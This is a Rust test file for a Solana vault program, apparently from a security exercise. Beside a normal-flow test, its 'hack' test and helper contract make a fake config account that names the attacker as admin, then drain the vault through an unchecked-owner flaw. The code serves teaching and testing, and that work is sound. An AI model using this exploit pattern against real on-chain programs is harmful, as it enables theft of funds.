use solana_program_test::{processor, tokio, ProgramTest};
use solana_sdk::instruction::AccountMeta;
use solana_sdk::native_token::LAMPORTS_PER_SOL;
use solana_sdk::pubkey::Pubkey;
use solana_sdk::signature::Keypair;
use solana_sdk::signer::Signer;
use solana_sdk::{instruction::Instruction, transaction::Transaction};
use solana_sdk::{system_instruction, system_program};

#[tokio::test]
async fn test_proper_flow() {
    let config = Keypair::new();
    let config_pubkey = config.pubkey();

    let mut client = utils::Client::new(config).await;
    client.fill_vault_with_treasure(10).await;

    // Vault is full now
    assert!(client.get_vault_balance().await.unwrap() > LAMPORTS_PER_SOL * 10);

    client.close_vault(config_pubkey).await;

    // Vault is closed
    assert!(client.get_vault_balance().await.is_err());

    // Admin received the money
    assert!(client.get_admin_balance().await.unwrap() > LAMPORTS_PER_SOL * 10);
}

#[tokio::test]
async fn hack() {
    let hacker = Keypair::new();
    let hacker_program_id = Pubkey::new_unique();
    let config_keypair = Keypair::new();
    let mut client = utils::Client::new_with_config(config_keypair, |programs| {
        // --- Deploy hacker program ---
        programs.add_program(
            "hacker_program",
            hacker_program_id,
            processor!(helper_contract::process_instruction),
        );
    })
    .await;

    // Cover hacker TX fee
    client.fund_account(hacker.pubkey(), LAMPORTS_PER_SOL).await;

    client.fill_vault_with_treasure(10).await;
    // Vault is full now
    assert!(client.get_vault_balance().await.unwrap() > LAMPORTS_PER_SOL * 10);

    // --- Hacker attack ---
    let banks = client.get_banks_client_mut().await;
    // let hacker_config = todo!();
    // let accounts = vec![todo!()];
    let hacker_config = Keypair::new();
    let accounts = vec![
        AccountMeta::new(hacker.pubkey(), true),
        AccountMeta::new(hacker_config.pubkey(), true),
        AccountMeta::new_readonly(system_program::ID, false),
    ];
    let ix = Instruction::new_with_borsh(
        hacker_program_id,
        &account_confusion::state::Config {
            admin: hacker.pubkey(),
        },
        accounts,
    );
    let tx = Transaction::new_signed_with_payer(
        &[ix],
        Some(&hacker.pubkey()),
        &[&hacker, &hacker_config],
        banks.get_latest_blockhash().await.unwrap(),
    );

    banks.process_transaction(tx).await.unwrap();

    client
        .close_vault_with_payer(hacker_config.pubkey(), &hacker)
        .await;

    // --- End of attack ---

    // Vault is closed
    assert!(client.get_vault_balance().await.is_err());

    // Hacker received the money
    assert!(client.get_balance(hacker.pubkey()).await.unwrap() > LAMPORTS_PER_SOL * 10);
}

mod helper_contract {

    use borsh::{BorshDeserialize, BorshSerialize};
    use solana_sdk::{
        account_info::{next_account_info, AccountInfo},
        entrypoint::ProgramResult,
        msg,
        program::invoke,
        sysvar::Sysvar,
    };

    use super::*;
    pub fn process_instruction(
        program_id: &Pubkey,
        accounts: &[AccountInfo],
        instruction_data: &[u8],
    ) -> ProgramResult {
        msg!("Our hacker helper contract is here!");

        let config_data = account_confusion::state::Config::try_from_slice(instruction_data)?;
        let accounts = &mut accounts.iter();
        let payer = next_account_info(accounts)?;
        let config = next_account_info(accounts)?;

        if !payer.is_signer {
            msg!("Payer is not a signer");
            return Err(solana_program::program_error::ProgramError::MissingRequiredSignature);
        }

        if !config.is_signer {
            msg!("Config is not a signer");
            return Err(solana_program::program_error::ProgramError::MissingRequiredSignature);
        }

        let len = std::mem::size_of::<account_confusion::state::Config>();
        let rent = solana_program::rent::Rent::get()?.minimum_balance(len);

        let ix = system_instruction::transfer(payer.key, config.key, rent);
        invoke(&ix, &[payer.clone(), config.clone()])?;

        let ix = system_instruction::allocate(config.key, len as u64);
        invoke(&ix, &[config.clone()])?;

        let ix = system_instruction::assign(config.key, program_id);
        invoke(&ix, &[config.clone()])?;

        config_data.serialize(&mut &mut config.data.borrow_mut()[..])?;

        Ok(())
    }
}

mod utils {
    use account_confusion::instruction::BlabladurInstruction;
    use solana_program_test::BanksClient;
    use solana_sdk::{hash::Hash, native_token::LAMPORTS_PER_SOL};

    use super::*;
    pub struct Client {
        payer: Keypair,
        recent_blockhash: Hash,
        client: BanksClient,
        program_id: Pubkey,
        vault: Pubkey,
    }

    impl Client {
        pub async fn new(keypair: Keypair) -> Self {
            Self::new_internal::<fn(&mut ProgramTest) -> ()>(keypair, None).await
        }

        pub async fn new_with_config<F>(keypair: Keypair, conf: F) -> Self
        where
            F: FnOnce(&mut ProgramTest),
        {
            Self::new_internal(keypair, Some(conf)).await
        }

        async fn new_internal<F>(keypair: Keypair, configurator: Option<F>) -> Self
        where
            F: FnOnce(&mut ProgramTest),
        {
            let config = keypair;
            let program_id = Pubkey::new_unique();
            let (vault, _) = Pubkey::find_program_address(&[b"vault"], &program_id);

            let mut program = ProgramTest::new(
                "unchecked_owner",
                program_id,
                processor!(account_confusion::process_instruction),
            );

            if let Some(configurator) = configurator {
                configurator(&mut program);
            }

            let (mut banks_client, payer, recent_blockhash) = program.start().await;

            let accounts = vec![
                AccountMeta::new(payer.pubkey(), true),
                AccountMeta::new(config.pubkey(), true),
                AccountMeta::new(vault, false),
                AccountMeta::new_readonly(system_program::ID, false),
            ];

            let ix = Instruction::new_with_borsh(
                program_id,
                &BlabladurInstruction::Initialise,
                accounts,
            );

            let tx = Transaction::new_signed_with_payer(
                &[ix],
                Some(&payer.pubkey()),
                &[&payer, &config],
                recent_blockhash,
            );

            banks_client.process_transaction(tx).await.unwrap();

            Self {
                payer,
                recent_blockhash,
                client: banks_client,
                program_id,
                vault,
            }
        }

        async fn close_vault_internal(
            config: Pubkey,
            payer: &Keypair,
            program_id: Pubkey,
            vault: Pubkey,
            recent_blockhash: Hash,
            client: &mut BanksClient,
        ) {
            let accounts = vec![
                AccountMeta::new(payer.pubkey(), true),
                AccountMeta::new_readonly(config, false),
                AccountMeta::new(vault, false),
            ];

            let ix = Instruction::new_with_borsh(
                program_id,
                &BlabladurInstruction::CloseContract,
                accounts,
            );

            let mut tx = Transaction::new_signed_with_payer(
                &[ix],
                Some(&payer.pubkey()),
                &[payer],
                recent_blockhash,
            );
            tx.sign(&[payer], recent_blockhash);

            client.process_transaction(tx).await.unwrap();
        }

        pub async fn close_vault(&mut self, config: Pubkey) {
            Self::close_vault_internal(
                config,
                &self.payer,
                self.program_id,
                self.vault,
                self.recent_blockhash,
                &mut self.client,
            )
            .await;
        }

        pub async fn close_vault_with_payer(&mut self, config: Pubkey, payer: &Keypair) {
            Self::close_vault_internal(
                config,
                payer,
                self.program_id,
                self.vault,
                self.recent_blockhash,
                &mut self.client,
            )
            .await;
        }

        pub async fn fill_vault_with_treasure(&mut self, amount: u64) {
            let ix = system_instruction::transfer(
                &self.payer.pubkey(),
                &self.vault,
                LAMPORTS_PER_SOL * amount,
            );

            let mut tx = Transaction::new_signed_with_payer(
                &[ix],
                Some(&self.payer.pubkey()),
                &[&self.payer],
                self.recent_blockhash,
            );
            tx.sign(&[&self.payer], self.recent_blockhash);

            self.client.process_transaction(tx).await.unwrap();
        }

        pub async fn get_vault_balance(&mut self) -> Result<u64, ()> {
            self.get_balance(self.vault).await
        }

        pub async fn get_admin_balance(&mut self) -> Result<u64, ()> {
            self.get_balance(self.payer.pubkey()).await
        }

        pub async fn get_balance(&mut self, account: Pubkey) -> Result<u64, ()> {
            self.client
                .get_account(account)
                .await
                .unwrap()
                .map(|a| a.lamports)
                .ok_or(())
        }

        pub async fn get_banks_client_mut(&mut self) -> &mut BanksClient {
            &mut self.client
        }

        pub async fn fund_account(&mut self, account: Pubkey, amount: u64) {
            let ix = system_instruction::transfer(&self.payer.pubkey(), &account, amount);

            let mut tx = Transaction::new_signed_with_payer(
                &[ix],
                Some(&self.payer.pubkey()),
                &[&self.payer],
                self.recent_blockhash,
            );
            tx.sign(&[&self.payer], self.recent_blockhash);

            self.client.process_transaction(tx).await.unwrap();
        }
    }
}
